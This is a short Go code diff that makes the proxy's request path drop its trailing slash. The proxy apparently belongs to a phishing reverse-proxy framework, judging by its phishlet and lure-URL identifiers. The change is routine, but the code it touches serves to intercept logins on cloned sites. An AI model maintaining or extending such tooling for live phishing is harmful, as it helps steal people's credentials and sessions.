@@ -211,10 +211,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
 			o_host := req.Host
 			lure_url := req_url
-			req_path := req.URL.Path
+			req_path := strings.TrimSuffix(req.URL.Path, "/") // Remove trailing slash
 			if req.URL.RawQuery != "" {
 				req_url += "?" + req.URL.RawQuery
-				// Keep req_path as base path without query parameters
+				// Keep req_path normalized without trailing slash
 			}
 
 			pl := p.getPhishletByPhishHost(req.Host)
